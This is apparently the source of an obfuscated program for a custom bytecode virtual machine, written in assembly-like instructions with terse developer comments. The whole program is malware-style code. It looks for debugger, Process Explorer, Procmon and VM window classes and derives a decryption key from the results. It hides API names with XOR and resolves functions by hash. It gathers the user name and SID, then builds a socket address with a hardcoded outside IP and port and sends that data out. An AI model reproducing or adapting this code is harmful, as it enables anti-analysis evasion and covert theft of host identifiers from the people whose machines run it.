PUSH 0xfffefdfcfbfa
PUSH 0xf9f8f7f6f5f4
PUSH 0xf3f2f1f0efee
PUSH 0xedecebeae9a8
PUSH 0xe7e6e5e4e3e2
PUSH 0xe1e0dfdedddc
PUSH 0xdbdad9d8d7d6
PUSH 0xd5d4d3d2d1d0
PUSH 0xcfcecdcbcac9
PUSH 0xc8c7c6c5c4c3
MOV R0, 0x558BEC64
PUSH 0xc2c1c0bfbebd
MOV R20, 0x64EC8B55
PUSH 0xbcbbbab9b8b7
MOV R1, 0xA1C40000
PUSH 0xb6b5b4b3b2b1
MOV R16, 0x0000C4A1
PUSH 0xb0afaeadacab
MOV R3, 0x10000000
PUSH 0xaaa9a8a7a6a5
MUL R3, 0x10
PUSH 0xa4a3a2a1a09f
MUL R0, R3
PUSH 0x9e9d9c9b9a99
ADD R0, R1
PUSH 0x989796959493
MOV R333, 0x10000000
MUL R333, 0x10
MOV R10, R0
PUSH 0x9291908f8e8d
MOV R0, 0x002D1904 
PUSH 0x8c8b8a898887
MOV R1, 0x00008BE5
PUSH 0x868584838281
MUL R0, R3
PUSH 0x807f7e7d7c7b
ADD R0, R1
PUSH 0x7a7978777675
MOV R11, R0
PUSH 0x74737271706f
MOV R0, 0x5dc30000
PUSH 0x6e6d6c6b6a69
MUL R0, R3
PUSH 0x686766656463
MOV R12, R0
PUSH R10
PUSH R11
PUSH R12
NATIVECALLFROMSTACK R8, 0x03
CMP R8, 0x0
JMP NEQ 50
POP R0
POP R1
POP R2
POP R3
POP R4
POP R5
POP R6
POP R10
POP R11
POP R12
POP R13
POP R14
POP R15
POP R16
POP R20
POP R21
POP R22
POP R23
POP R24
POP R25
POP R26
MOV R0, 0x040d
STORE qword [R64764], R0
STORE qword [R64764+0x8], R0
STORE qword [R64764+0x10], R0
STORE qword [R64764+0x18], R1
STORE qword [R64764+0x20], R4
STORE qword [R64764+0x28], R5
STORE qword [R64764+0x30], R6
STORE qword [R64764+0x38], R10
STORE qword [R64764+0x40], R11
STORE qword [R64764+0x48], R12
STORE qword [R64764+0x50], R13
STORE qword [R64764+0x58], R14
STORE qword [R64764+0x60], R15
STORE qword [R64764+0x68], R16
STORE qword [R64764+0x70], R20
STORE qword [R64764+0x78], R21
STORE qword [R64764+0x80], R22
STORE qword [R64764+0x88], R23
STORE qword [R64764+0x90], R24
STORE qword [R64764+0x98], R25
STORE qword [R64764+0xa0], R26
JMP -92
PUSH 0xf00fa00a
PUSH 0xe00eb00b
PUSH 0xd00dc00c
PUSH 0xa00a9009
PUSH 0x1001a00a
PUSH 0x2002b00b
PUSH 0x3003c00c
PUSH 0x4004d00d
PUSH 0x5005e00e
PUSH 0x6006f00f
PUSH 0x7007f00f
# R44, R47, R48, R50, R52, R54, R55, R57, R58, R59, R60, R62, R64, R66
MOV R44, 0x10000001
MOV R45, 0x0000fafa
MOV R46, 0x10000000
MUL R46, 0x10
MUL R45, R46
ADD R44, R45
MOV R434, 0x64A13000
MUL R434, R333
ADD R434, 0x0fb6
MOV R545, 0x4002c3cc
MUL R545, R333
ADD R545, 0xcccccccc
PUSH R434
PUSH R545
NATIVECALLFROMSTACK R195, 0x2
CMP R195, 0x1
JMP NEQ 2
JMP 0
MOV R0, R0
MOV R0, R0
STORE qword [R64764+0x640], R44
MOV R47, 0x12000101
STORE qword [R64764+0x648], R47
MOV R48, 0x11000101
MOV R49, 0x01000000
MUL R49, R46
ADD R48, R49
STORE qword [R64764+0x650], R48
MOV R50, 0x00000401
MOV R51, 0x00001000
MUL R51, R46
ADD R50, R51
STORE qword [R64764+0x658], R50
MOV R52, 0x06
MOV R53, 0x1100
MUL R53, R46
ADD R52, R53
STORE qword [R64764+0x660], R52
MOV R54, 0x10000013
STORE qword [R64764+0x668], R54
MOV R55, 0x11000105
MOV R56, 0x0b000000
MUL R56, R46
ADD R55, R56
STORE qword [R64764+0x670], R55
MOV R57, 0x11000107
MOV R58, 0xfb000000
MUL R58, R46
MOV R434, 0x64A13000
MUL R434, R333
ADD R434, 0x0fb6
MOV R545, 0x4002c3cc
MUL R545, R333
ADD R545, 0xcccccccc
PUSH R434
PUSH R545
NATIVECALLFROMSTACK R195, 0x2
CMP R195, 0x1
JMP NEQ 2
JMP 0
MOV R0, R0
MOV R0, R0
ADD R57, R58
STORE qword [R64764+0x678], R57
MOV R58, 0x12000008
STORE qword [R64764+0x680], R58
MOV R59, 0x10000008
STORE qword [R64764+0x688], R59
MOV R60, 0x1200010c
# size of decrypt
MOV R61, 0x86030000
MUL R61, R46
ADD R60, R61
STORE qword [R64764+0x690], R60
MOV R62, 0x0001030d
MOV R63, 0x00080000
MUL R63, R46
ADD R62, R63
STORE qword [R64764+0x698], R62
MOV R64, 0x0000010a
MOV R65, 0xefbeadde
MUL R65, R46
ADD R64, R65
STORE qword [R64764+0x6a0], R64
MOV R66, 0x0000010a
MOV R67, 0xdec0adde
MUL R67, R46
ADD R66, R67
STORE qword [R64764+0x6a8], R66
MOV R0, R1
MOV R2, R3
MOV R4, R5
MOV R6, R7
MOV R8, R9
MOV R10, R11
MOV R12, R13
MOV R14, R15
MOV R16, R17
MOV R18, R19
MOV R20, R21
MOV R22, R23
MOV R24, R25
MOV R26, R27
MOV R28, R29
MOV R30, R31
MOV R32, R33
MOV R34, R35
MOV R36, R37
MOV R38, R39
MOV R40, R41
MOV R42, R43
MOV R44, R45
MOV R46, R47
MOV R48, R49
MOV R50, R51
MOV R52, R53
MOV R54, R55
MOV R56, R57
MOV R58, R59
MOV R60, R61
MOV R62, R63
MOV R64, R65
MOV R66, R67
MOV R68, R69
MOV R70, R71
MOV R72, R73
MOV R74, R75
MOV R76, R77
MOV R78, R79
MOV R80, R81
MOV R82, R83
MOV R84, R85
MOV R86, R87
MOV R88, R89
MOV R90, R91
MOV R92, R93
MOV R94, R95
MOV R96, R97
MOV R98, R99
MOV R34, R35
MOV R36, R37
MOV R193, 0x0
MOV R194, 0x0
MOV R192, 0x0
# check first string with Window Class Name
# Qt5QWindowIcon
MOV R434, 0x64A13000
MUL R434, R333
ADD R434, 0x0fb6
MOV R545, 0x4002c3cc
MUL R545, R333
ADD R545, 0xcccccccc
PUSH R434
PUSH R545
NATIVECALLFROMSTACK R195, 0x2
CMP R195, 0x1
JMP NEQ 2
JMP 0
MOV R0, R0
MOV R0, R0
VAFD 0x102, R8
MOV R99, 0x1c
MUSS R99, R8, R3
MOV R98, 0x0
MOV shadow R9, 0
MUSS R98, R9, R2
MOV shadow R1, 0x0
MOV R434, 0x64A13000
MUL R434, R333
ADD R434, 0x0fb6
MOV R545, 0x4002c3cc
MUL R545, R333
ADD R545, 0xcccccccc
PUSH R434
PUSH R545
NATIVECALLFROMSTACK R195, 0x2
CMP R195, 0x1
JMP NEQ 2
JMP 0
MOV R0, R0
MOV R0, R0
MOV shadow R4, 0x0
MOV shadow R5, 0x0
MOV shadow R6, 0xffffffff
MOV shadow R256, 0x106c
SYSCALL 6
MOV R434, 0x64A13000
MUL R434, R333
ADD R434, 0x0fb6
MOV R545, 0x4002c3cc
MUL R545, R333
ADD R545, 0xcccccccc
PUSH R434
PUSH R545
NATIVECALLFROMSTACK R195, 0x2
CMP R195, 0x1
JMP NEQ 2
JMP 0
MOV R0, R0
MOV R0, R0
MOV shadow R192, R0
# check second string 
# PROCEXPL
VAFD 0x120, R8
MOV R99, 0x10
MUSS R99, R8, R3
SYSCALL 6
MOV shadow R193, R0
ADD R192, R193
# PROCMON_WINDOW_CLASS
VAFD 0x132, R8
MOV R99, 0x28
MUSS R99, R8, R3
SYSCALL 6
MOV shadow R194, R0
ADD R192, R194
# WinDbgFrameClass
VAFD 0x15c, R8
MOV R99, 0x20
MUSS R99, R8, R3
SYSCALL 6
MOV shadow R194, R0
ADD R192, R194
# VMUIFrame
VAFD 0x17e, R8
MOV R99, 0x12
MUSS R99, R8, R3
SYSCALL 6
# start to calc key
MOV shadow R194, R0
ADD R192, R194
MOV R20, 0x53
MOV R0, 0x0
MOV R1, 0x0
MOV R2, 0x0
SUB R20, 0x7
MOV R3, 0x0
MOV R4, 0x0
MOV R5, 0x0
XOR R20, 0xd
MOV R6, 0x0
MOV R7, 0x0
MOV R8, 0x0
MOV R28, 0x70
SUB R28, 0x7
MOV R9, 0x0
MOV R10, 0x0
MOV R11, 0x0
MOV R12, 0x0
MOV R13, 0x0
MOV R14, 0x3fc1bd8d
ADD R0, R192
MUL R0, 0x8
MOD R0, 0x100
ADD R1, R0
ADD R1, R192
INC R3
INC R4
ADD R3, 0x100
ADD R4, R3
SUB R3, R192
XOR R28, 0xd
ADD R4, R3
ADD R3, R4
ADD R3, 0x1f98f0
ADD R4, 0x2bc199
ADD R5, 0x3e8f01
ADD R5, R192
SUB R4, R192
MOV R6, 0x4
MUL R6, R192
MOV R7, R6
MOV R9, R7
ADD R9, R6
ADD R9, R5
ADD R9, R4
ADD R9, R3
ADD R9, R2
ADD R9, R1
ADD R9, R0
MOV R333, 0x10000000
MUL R333, 0x10
MUL R9, R333
MOV R24, R28
MUL R24, 0x100
ADD R9, R24
ADD R9, 0x8a
MUL R99, 0x10000
ADD R9, R99
XOR R9, R545
MOV R1228, R9
MOV R434, 0x64A13000
MUL R434, R333
ADD R434, 0x0fb6
MOV R545, 0x4002c3cc
MUL R545, R333
ADD R545, 0xcccccccc
PUSH R434
PUSH R545
NATIVECALLFROMSTACK R195, 0x2
CMP R195, 0x1
JMP NEQ 2
JMP 0
MOV R0, R0
MOV R0, R0
# R1228 - tmp reg of key
MOV R9, 0x0
# add check to Debuger
# add key generation
FBH R14, R8
MOV R31, 0x82
SUB R31, 0x7
XOR R31, 0xd
MOV R49, 0x73
SUB R49, 0x7
XOR R49, 0xd
MOV R54, 0x84
SUB R54, 0x7
XOR R54, 0xd
MOV R88, 0x6b
SUB R88, 0x7
XOR R88, 0xd
MOV R91, 0x45
SUB R91, 0x7
XOR R91, 0xd
MOV R465, 0x46
SUB R465, 0x7
XOR R465, 0xd
MOV R299, 0x2a
SUB R299, 0x7
XOR R299, 0xd
MOV R201, 0x70
SUB R201, 0x7
XOR R201, 0xd
MOV R401, 0x68
SUB R401, 0x7
XOR R401, 0xd
MOV R503, 0x68
SUB R503, 0x7
XOR R503, 0xd
STORE byte [R64250], R20
STORE byte [R64250+0x1], R28
STORE byte [R64250+0x2], R31
STORE byte [R64250+0x3], R49
STORE byte [R64250+0x4], R54
STORE byte [R64250+0x5], R88
STORE byte [R64250+0x6], R91
STORE byte [R64250+0x7], R465
STORE byte [R64250+0x8], R299
STORE byte [R64250+0x9], R201
STORE byte [R64250+0x0a], R401
STORE byte [R64250+0x0b], R503
# test this shit
VAFD 0x0, R9
MOV shadow R9, R9
EXCALL 1
# LoadLibrary("Advapi32.dll")
MOV R9, R1
MOV R15, 0xc97c1fff
FBH R15, R8
# find by hash function "GetProcAddress"
# load "GetUsernameA" in data section
MOV R20, 0x39
ADD R20, 0x11
XOR R20, 0xd
MOV R28, 0x57
ADD R28, 0x11
XOR R28, 0xd
MOV R31, 0x68
ADD R31, 0x11
XOR R31, 0xd
MOV R49, 0x47
ADD R49, 0x11
XOR R49, 0xd
MOV R54, 0x6d
ADD R54, 0x11
XOR R54, 0xd
MOV R88, 0x57
ADD R88, 0x11
XOR R88, 0xd
MOV R91, 0x6e
ADD R91, 0x11
XOR R91, 0xd
MOV R465, 0x32
ADD R465, 0x11
XOR R465, 0xd
MOV R299, 0x5b
ADD R299, 0x11
XOR R299, 0xd
MOV R201, 0x4f
ADD R201, 0x11
XOR R201, 0xd
MOV R401, 0x57
ADD R401, 0x11
XOR R401, 0xd
MOV R503, 0x3b
ADD R503, 0x11
XOR R503, 0xd
STORE byte [R64250], R20
STORE byte [R64250+0x1], R28
STORE byte [R64250+0x2], R31
STORE byte [R64250+0x3], R49
STORE byte [R64250+0x4], R54
STORE byte [R64250+0x5], R88
STORE byte [R64250+0x6], R91
STORE byte [R64250+0x7], R465
STORE byte [R64250+0x8], R299
STORE byte [R64250+0x9], R201
STORE byte [R64250+0x0a], R401
STORE byte [R64250+0x0b], R503
VAFD 0x0, R9
MOV shadow R10, R9
EXCALL 2
MOV R101, R1
VAFD 0x198, R9
MOV shadow R10, R9
EXCALL 2 
MOV R102, R1
MOV R0, R101
MOV R1, R102
SID R301, R302, R303
MOV R434, 0x64A13000
MUL R434, R333
ADD R434, 0x0fb6
MOV R545, 0x4002c3cc
MUL R545, R333
ADD R545, 0xcccccccc
PUSH R434
PUSH R545
NATIVECALLFROMSTACK R195, 0x2
CMP R195, 0x1
JMP NEQ 2
JMP 0
MOV R0, R0
MOV R1, R2
MOV R2, R4
MOV R3, R6
MOV R4, R8
# LoadLibrary("WS2_32.dll")
VAFD 0x1AC, R9
MOV R304, R1228
MOV shadow R9, R9
MOV R99, 0x3fc1bd8d
FBH R99, R8
EXCALL 1 
MOV R9, R1
MOV R15, 0xc97c1fff
FBH R15, R8
VAFD 0x1b8, R10
MOV shadow R10, R10
EXCALL 2
MOV R201, R1
VAFD 0x1c4, R10
MOV shadow R10, R10
EXCALL 2
MOV R202, R1
VAFD 0x1cc, R10
MOV shadow R10, R10
EXCALL 2
MOV R203, R1
VAFD 0x1d5, R10
MOV shadow R10, R10
EXCALL 2
MOV R204, R1
VAFD 0x1db, R10
MOV shadow R10, R10
EXCALL 2
MOV R205, R1
VAFD 0x1e5, R10
MOV shadow R10, R10
EXCALL 2
MOV R206, R1
VAFD 0x1eb, R10
MOV shadow R10, R10
EXCALL 2
MOV R207, R1
VAFD 0x1f8, R10
MOV shadow R10, R10
EXCALL 2
MOV R208, R1
MOV R10, R201
MOV R11, R202
MOV R12, R203
MOV R2001, 0x4ce04ab7
MOV R2002, 0x10000000
MUL R2002, 0x10
MUL R2001, R2002
ADD R2001, 0x7a84a931
MOV R601, R301
MOV R602, R302
MOV R603, R303
XOR R601, R2001
MOV R2001, 0xd5a7330b
MUL R2001, R2002
ADD R2001, 0xc378eb10
XOR R602, R2001
MOV R2001, 0xb0d53cf7
MUL R2001, R2002
ADD R2001, 0xa628d137
XOR R603, R2001
MOV R13, R204
MOV R14, R205
MOV R15, R206
MOV R16, R207
MOV R17, R208
MOV R465, 0x0
MOV R20, 0x34
MOV R28, 0x15
MOV R32, 0x200
MOV R31, 0x97
MOV R49, 0xec
MOV R54, 0x72
MOV R88, 0x96
MOV R21, 0x2
MOV R19, 0x0202
MOV R982, 0x18
STORE byte [R64250], R21
STORE byte [R64250+0x1], R465
STORE byte [R64250+0x2], R20
STORE byte [R64250+0x3], R28
STORE byte [R64250+0x4], R31
STORE byte [R64250+0x5], R49
STORE byte [R64250+0x6], R54
STORE byte [R64250+0x7], R88
STORE byte [R64250+0x8], R465
STORE byte [R64250+0x9], R465
STORE byte [R64250+0x0a], R465
STORE byte [R64250+0x0b], R465
STORE byte [R64250+0x0c], R465
STORE byte [R64250+0x0d], R465
STORE byte [R64250+0x0e], R465
STORE byte [R64250+0x0f], R465
STORE byte [R64250+0x10], R465
STORE qword [R64250+0x20], R601
STORE qword [R64250+0x28], R602
STORE qword [R64250+0x30], R603
VAFD 0x0, R10
MOV shadow R18, R10
VAFD 0x20, R10
MOV shadow R981, R10
SENDSID
PUSH 0x7509a8d1
PUSH 0x3d458a9a
PUSH 0x86638042
PUSH 0xfe96e8d3
PUSH 0xd61a722d
PUSH 0x2bc08fec
PUSH 0xa1250f31
PUSH 0x17c83770
PUSH 0xc2d8517d
PUSH 0x711d70db
PUSH 0x211010aa
PUSH 0x60c28286
PUSH 0xbd6abca2
PUSH 0xba6139c2
PUSH 0x8dd08f9b
PUSH 0x4185d82e
PUSH 0xba23e326
PUSH 0x3e3e6e8a
PUSH 0x46230e9
PUSH 0xa921860a
PUSH 0x92ea10c4
PUSH 0xcfdcf2e8
PUSH 0xe182ccd4
PUSH 0x65884f40
PUSH 0xc39dda43
PUSH 0xb5861d4f
PUSH 0x987cd519
PUSH 0x94dca2b5
PUSH 0x442a0d21
PUSH 0x59d7a68d
PUSH 0xd4939d8f
PUSH 0x46b7bc9e
PUSH 0x7f19a65a
PUSH 0xa0ba4c72
PUSH 0x13627676
PUSH 0x92013d0b
PUSH 0x9960a493
PUSH 0x66b811b3
PUSH 0xa3a23b11
PUSH 0xf9065c63
PUSH 0x3aa32597
PUSH 0xd50145c2
PUSH 0xb9af23bc
PUSH 0x2f3cf6f2
PUSH 0x83cd3009
PUSH 0x3fc17bf1
PUSH 0x846f4f42
PUSH 0x442263a2
PUSH 0x9c9f3ba2
PUSH 0x870ca167
PUSH 0x706e84bc
PUSH 0x68bc94e5
PUSH 0xd3253147
PUSH 0xe383221c
PUSH 0x961edd6e
PUSH 0x5ae8d10
PUSH 0x37d148f3
PUSH 0x63c466e7
PUSH 0x6253bb7d
PUSH 0x29162350
#